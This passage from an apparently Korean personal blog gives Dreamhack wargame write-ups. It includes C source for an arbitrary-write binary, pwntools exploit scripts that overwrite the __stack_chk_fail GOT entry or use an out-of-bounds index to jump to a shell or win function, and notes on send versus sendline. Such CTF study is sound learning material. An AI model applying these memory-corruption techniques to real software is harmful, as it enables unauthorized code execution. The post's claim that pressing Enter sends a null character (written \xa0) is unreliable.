\\\"\"}],[\"$\",\"span\",\"span-38\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-39\",{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n    \",[\"$\",\"span\",\"span-40\",{\"className\":\"token function\",\"children\":\"scanf\"}],[\"$\",\"span\",\"span-41\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-42\",{\"className\":\"token string\",\"children\":\"\\\"%ld\\\"\"}],[\"$\",\"span\",\"span-43\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",\"span-44\",{\"className\":\"token operator\",\"children\":\"\u0026\"}],\"addr\",[\"$\",\"span\",\"span-45\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-46\",{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n    \",[\"$\",\"span\",\"span-47\",{\"className\":\"token function\",\"children\":\"printf\"}],[\"$\",\"span\",\"span-48\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-49\",{\"className\":\"token string\",\"children\":\"\\\"Value : \\\"\"}],[\"$\",\"span\",\"span-50\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-51\",{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n    \",[\"$\",\"span\",\"span-52\",{\"className\":\"token function\",\"children\":\"scanf\"}],[\"$\",\"span\",\"span-53\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-54\",{\"className\":\"token string\",\"children\":\"\\\"%ld\\\"\"}],[\"$\",\"span\",\"span-55\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",\"span-56\",{\"className\":\"token operator\",\"children\":\"\u0026\"}],\"value\",[\"$\",\"span\",\"span-57\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-58\",{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\\n    \",[\"$\",\"span\",\"span-59\",{\"className\":\"token operator\",\"children\":\"*\"}],[\"$\",\"span\",\"span-60\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-61\",{\"className\":\"token keyword\",\"children\":\"long\"}],\" \",[\"$\",\"span\",\"span-62\",{\"className\":\"token operator\",\"children\":\"*\"}],[\"$\",\"span\",\"span-63\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"addr \",[\"$\",\"span\",\"span-64\",{\"className\":\"token operator\",\"children\":\"=\"}],\" value\",[\"$\",\"span\",\"span-65\",{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\\n    \",[\"$\",\"span\",\"span-66\",{\"className\":\"token keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",\"span-67\",{\"className\":\"token number\",\"children\":\"0\"}],[\"$\",\"span\",\"span-68\",{\"className\":\"token punctuation\",\"children\":\";\"}],\"\\n\",[\"$\",\"span\",\"span-69\",{\"className\":\"token punctuation\",\"children\":\"}\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",\"p-8\",{\"children\":[\"임의의 주소값에 원하는 값을 대입할 수 있는 바이너리이다\",[\"$\",\"br\",\"br-0\",{}],\"\\n\",\"buf 입력을 0x80만큼 받기 때문에 버퍼 오버플로우가 발생할 수도 있어 ret 주소를 get _shell 함수의 주소로 바꾸어 풀이할 수도 있을 것 같다\",[\"$\",\"br\",\"br-1\",{}],\"\\n\",\"system 함수가 실행되도록 movaps도 같이 신경 써주면 풀릴 것 같지만 직접 해보지 않았다..\"]}],\"\\n\",[\"$\",\"hr\",\"hr-2\",{}],\"\\n\",[\"$\",\"p\",\"p-9\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2\u0026fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FCx0D8%2FbtsL2dszNR8%2FVyAXeXDSYkUaeedN9dIG61%2Fimg.png\",\"alt\":\"External Image\"}]}],\"\\n\",[\"$\",\"p\",\"p-10\",{\"children\":\"카나리 값이 어긋나면 __stack_chk_fail 을 호출하기 때문에 __stack_chk_fail의 GOT를 get_shell 주소로 덮어씌워 풀이했다\"}],\"\\n\",[\"$\",\"hr\",\"hr-3\",{}],\"\\n\",[\"$\",\"pre\",\"pre-3\",{\"className\":\"language-python\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-python\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"token keyword\",\"children\":\"from\"}],\" pwn \",[\"$\",\"span\",\"span-1\",{\"className\":\"token keyword\",\"children\":\"import\"}],\" \",[\"$\",\"span\",\"span-2\",{\"className\":\"token operator\",\"children\":\"*\"}],\"\\n\\nport \",[\"$\",\"span\",\"span-3\",{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",\"span-4\",{\"className\":\"token number\",\"children\":\"00000\"}],\"\\np \",[\"$\",\"span\",\"span-5\",{\"className\":\"token operator\",\"children\":\"=\"}],\" process\",[\"$\",\"span\",\"span-6\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-7\",{\"className\":\"token string\",\"children\":\"'./ssp_000'\"}],[\"$\",\"span\",\"span-8\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\np \",[\"$\",\"span\",\"span-9\",{\"className\":\"token operator\",\"children\":\"=\"}],\" remote\",[\"$\",\"span\",\"span-10\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-11\",{\"className\":\"token string\",\"children\":\"'host1.dreamhack.games'\"}],[\"$\",\"span\",\"span-12\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" port\",[\"$\",\"span\",\"span-13\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\ne \",[\"$\",\"span\",\"span-14\",{\"className\":\"token operator\",\"children\":\"=\"}],\" ELF\",[\"$\",\"span\",\"span-15\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-16\",{\"className\":\"token string\",\"children\":\"'./ssp_000'\"}],[\"$\",\"span\",\"span-17\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" checksec \",[\"$\",\"span\",\"span-18\",{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",\"span-19\",{\"className\":\"token boolean\",\"children\":\"False\"}],[\"$\",\"span\",\"span-20\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\n\\n\",[\"$\",\"span\",\"span-21\",{\"className\":\"token comment\",\"children\":\"# context.log_level = 'debug'\"}],\"\\n\\npayload \",[\"$\",\"span\",\"span-22\",{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",\"span-23\",{\"className\":\"token string\",\"children\":\"b'A'\"}],\" \",[\"$\",\"span\",\"span-24\",{\"className\":\"token operator\",\"children\":\"*\"}],\" \",[\"$\",\"span\",\"span-25\",{\"className\":\"token number\",\"children\":\"0x4a\"}],\"\\n\\np\",[\"$\",\"span\",\"span-26\",{\"className\":\"token punctuation\",\"children\":\".\"}],\"send\",[\"$\",\"span\",\"span-27\",{\"className\":\"token punctuation\",\"children\":\"(\"}],\"payload\",[\"$\",\"span\",\"span-28\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\np\",[\"$\",\"span\",\"span-29\",{\"className\":\"token punctuation\",\"children\":\".\"}],\"sendlineafter\",[\"$\",\"span\",\"span-30\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-31\",{\"className\":\"token string\",\"children\":\"b'Addr : '\"}],[\"$\",\"span\",\"span-32\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",\"span-33\",{\"className\":\"token builtin\",\"children\":\"str\"}],[\"$\",\"span\",\"span-34\",{\"className\":\"token punctuation\",\"children\":\"(\"}],\"e\",[\"$\",\"span\",\"span-35\",{\"className\":\"token punctuation\",\"children\":\".\"}],\"got\",[\"$\",\"span\",\"span-36\",{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",\"span-37\",{\"className\":\"token string\",\"children\":\"'__stack_chk_fail'\"}],[\"$\",\"span\",\"span-38\",{\"className\":\"token punctuation\",\"children\":\"]\"}],[\"$\",\"span\",\"span-39\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-40\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\np\",[\"$\",\"span\",\"span-41\",{\"className\":\"token punctuation\",\"children\":\".\"}],\"sendlineafter\",[\"$\",\"span\",\"span-42\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-43\",{\"className\":\"token string\",\"children\":\"b'Value : '\"}],[\"$\",\"span\",\"span-44\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",\"span-45\",{\"className\":\"token builtin\",\"children\":\"str\"}],[\"$\",\"span\",\"span-46\",{\"className\":\"token punctuation\",\"children\":\"(\"}],\"e\",[\"$\",\"span\",\"span-47\",{\"className\":\"token punctuation\",\"children\":\".\"}],\"sym\",[\"$\",\"span\",\"span-48\",{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",\"span-49\",{\"className\":\"token string\",\"children\":\"'get_shell'\"}],[\"$\",\"span\",\"span-50\",{\"className\":\"token punctuation\",\"children\":\"]\"}],[\"$\",\"span\",\"span-51\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-52\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\n\\np\",[\"$\",\"span\",\"span-53\",{\"className\":\"token punctuation\",\"children\":\".\"}],\"interactive\",[\"$\",\"span\",\"span-54\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-55\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",\"p-11\",{\"children\":[\"메모리 주소는 p64, 문자열 전달은 str이라는 이분법적 사고에 사로잡혀 있어서 못 풀고 있었다..\",[\"$\",\"br\",\"br-0\",{}],\"\\n\",\"본 문제에서는 주소와 값을 %ld로 그대로 전달 받기 때문에 모두 str로 묶어서 별다른 패킹 없이 전달해줘야 한다\"]}],\"\\n\",[\"$\",\"hr\",\"hr-4\",{}],\"\\n\",[\"$\",\"p\",\"p-12\",{\"children\":[[\"$\",\"a\",\"a-0\",{\"href\":\"https://dreamhack.io/wargame/challenges/1617\",\"children\":\"https://dreamhack.io/wargame/challenges/1617\"}],\"\\n\",[\"$\",\"img\",\"img-0\",{\"src\":\"https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2\u0026fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FnuGMW%2FbtsL3jlrXzc%2FvZs8lHE3Itp7LDPFfYe5EK%2Fimg.png\",\"alt\":\"External Image\"}]]}],\"\\n\",[\"$\",\"p\",\"p-13\",{\"children\":\"Out of Bound로 푸는 문제다\"}],\"\\n\",[\"$\",\"hr\",\"hr-5\",{}],\"\\n\",[\"$\",\"pre\",\"pre-4\",{\"className\":\"language-python\",\"children\":[\"$\",\"code\",\"code-0\",{\"className\":\"language-python\",\"children\":[[\"$\",\"span\",\"span-0\",{\"className\":\"token keyword\",\"children\":\"from\"}],\" pwn \",[\"$\",\"span\",\"span-1\",{\"className\":\"token keyword\",\"children\":\"import\"}],\" \",[\"$\",\"span\",\"span-2\",{\"className\":\"token operator\",\"children\":\"*\"}],\"\\n\\np \",[\"$\",\"span\",\"span-3\",{\"className\":\"token operator\",\"children\":\"=\"}],\" process\",[\"$\",\"span\",\"span-4\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-5\",{\"className\":\"token string\",\"children\":\"'./prob'\"}],[\"$\",\"span\",\"span-6\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\np \",[\"$\",\"span\",\"span-7\",{\"className\":\"token operator\",\"children\":\"=\"}],\" remote\",[\"$\",\"span\",\"span-8\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-9\",{\"className\":\"token string\",\"children\":\"'host1.dreamhack.games'\"}],[\"$\",\"span\",\"span-10\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",\"span-11\",{\"className\":\"token number\",\"children\":\"17260\"}],[\"$\",\"span\",\"span-12\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\ne \",[\"$\",\"span\",\"span-13\",{\"className\":\"token operator\",\"children\":\"=\"}],\" ELF\",[\"$\",\"span\",\"span-14\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-15\",{\"className\":\"token string\",\"children\":\"'./prob'\"}],[\"$\",\"span\",\"span-16\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" checksec \",[\"$\",\"span\",\"span-17\",{\"className\":\"token operator\",\"children\":\"=\"}],\" \",[\"$\",\"span\",\"span-18\",{\"className\":\"token boolean\",\"children\":\"False\"}],[\"$\",\"span\",\"span-19\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\n\\np\",[\"$\",\"span\",\"span-20\",{\"className\":\"token punctuation\",\"children\":\".\"}],\"sendlineafter\",[\"$\",\"span\",\"span-21\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-22\",{\"className\":\"token string\",\"children\":\"b'val: '\"}],[\"$\",\"span\",\"span-23\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",\"span-24\",{\"className\":\"token string\",\"children\":\"b'-15'\"}],[\"$\",\"span\",\"span-25\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-26\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\np\",[\"$\",\"span\",\"span-27\",{\"className\":\"token punctuation\",\"children\":\".\"}],\"sendlineafter\",[\"$\",\"span\",\"span-28\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-29\",{\"className\":\"token string\",\"children\":\"b'val: '\"}],[\"$\",\"span\",\"span-30\",{\"className\":\"token punctuation\",\"children\":\",\"}],\" \",[\"$\",\"span\",\"span-31\",{\"className\":\"token builtin\",\"children\":\"str\"}],[\"$\",\"span\",\"span-32\",{\"className\":\"token punctuation\",\"children\":\"(\"}],\"e\",[\"$\",\"span\",\"span-33\",{\"className\":\"token punctuation\",\"children\":\".\"}],\"sym\",[\"$\",\"span\",\"span-34\",{\"className\":\"token punctuation\",\"children\":\"[\"}],[\"$\",\"span\",\"span-35\",{\"className\":\"token string\",\"children\":\"'win'\"}],[\"$\",\"span\",\"span-36\",{\"className\":\"token punctuation\",\"children\":\"]\"}],[\"$\",\"span\",\"span-37\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-38\",{\"className\":\"token punctuation\",\"children\":\".\"}],\"encode\",[\"$\",\"span\",\"span-39\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-40\",{\"className\":\"token punctuation\",\"children\":\")\"}],[\"$\",\"span\",\"span-41\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\n\\np\",[\"$\",\"span\",\"span-42\",{\"className\":\"token punctuation\",\"children\":\".\"}],\"interactive\",[\"$\",\"span\",\"span-43\",{\"className\":\"token punctuation\",\"children\":\"(\"}],[\"$\",\"span\",\"span-44\",{\"className\":\"token punctuation\",\"children\":\")\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",\"p-14\",{\"children\":\"buf의 인덱스에 값이 %lu로 들어가는 것이기에 패킹을 하면 안 된다\"}],\"\\n\",[\"$\",\"p\",\"p-15\",{\"children\":[\"바보 같은 나는 메모리 주소는 무조건 패킹이라 생각하고 p64 씌워놓고 왜 안 되지 하면서 무한 삽질 중이었다..\",[\"$\",\"br\",\"br-0\",{}],\"\\n\",\"아무튼 이렇게 값이 어떻게 전달되는지 확실하게 확인하고 패킹을 씌울지 말지 정해야 한다\"]}],\"\\n\",[\"$\",\"hr\",\"hr-6\",{}],\"\\n\",[\"$\",\"h2\",\"h2-2\",{\"children\":[\"$\",\"strong\",\"strong-0\",{\"children\":\"send / sendline\"}]}],\"\\n\",[\"$\",\"p\",\"p-16\",{\"children\":[\"처음 로드맵 따라갈 때 이것 때문에 애를 좀 먹었다\",[\"$\",\"br\",\"br-0\",{}],\"\\n\",\"지금은 잘 알고 쓰고 있지만 그냥 같이 정리해본다\"]}],\"\\n\",[\"$\",\"p\",\"p-17\",{\"children\":[\"scanf 또는 read 함수 등에 값을 입력할 때 사용자는 입력을 완료하기 위해 엔터를 눌러 널 문자(\\\\xa0)로 문자열의 종료를 알린다\",[\"$\",\"br\",\"br-0\",{}],\"\\n\",\"이때 scanf는 널 문자를 버리지만 read는 널 문자까지 받아버린다\"]}],\"\\n\",[\"$\",\"p\",\"p-18\",{\"children\":[\"send 함수는 인자 그대로 전송하고, sendline 함수는 인자에 널 문자를 붙여서 보낸다\",[\"$\",\"br\",\"br-0\",{}],\"\\n\",\"그래서 read 함수에 sendline으로 페이로드나 메모리 주소를 전달하면 널 문자가 포함되어 원하는대로 동작이 실행되지 않을 수도 있다\",[\"$\",\"br\",\"br-1\",{}],\"\\n\",\"특히 카나리에 덮어씌울 때 조심해야 한다\"]}],\"\\n\",[\"$\",\"p\",\"p-19\",{\"children\":\"이제 막 시스템 해킹 로드맵을 끝내서 후에 예외가 발생할 지는 아직 모르겠지만 현재로서는 read 함수에는 send, scanf 함수에는 sendline을 사용하고 있다\"}]]}]]}]\n"])</script><script>self.__next_f.push([1,"d:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\nb:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"1\",{\"children\":\"KoGandhi's World\"}],[\"$\",\"meta\",\"2\",{\"name\":\"description\",\"content\":\"Welcome to visit my place\"}]]\n"])</script><script>self.__next_f.push([1,"9:null\n"])</script></body></html>